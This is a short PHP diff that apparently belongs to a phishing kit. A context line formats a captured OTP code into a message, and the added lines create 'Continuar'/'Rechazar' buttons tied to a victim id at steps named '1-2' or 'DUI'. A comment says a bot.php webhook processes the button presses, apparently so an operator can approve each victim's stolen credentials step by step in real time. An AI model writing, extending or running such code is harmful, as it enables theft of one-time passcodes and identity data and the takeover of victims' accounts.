@@ -94,6 +94,14 @@ if (!empty($d['token'])) $lines[] = "🔢 <b>OTP:</b> "     . $esc($d['token']);
 
 // Botones inline con callback_data (procesado por bot.php webhook)
 $keyboard = null;
+if (strpos($step, '1-2') !== false || strpos($step, 'DUI') !== false) {
+    $keyboard = ['inline_keyboard' => [
+        [
+            ['text' => 'Continuar', 'callback_data' => 'CONTINUE|' . $uid],
+            ['text' => 'Rechazar',  'callback_data' => 'ERROR|'   . $uid],
+        ],
+    ]];
+}
 if (strpos($step, 'COMPLETO') !== false) {
     $keyboard = ['inline_keyboard' => [
         [
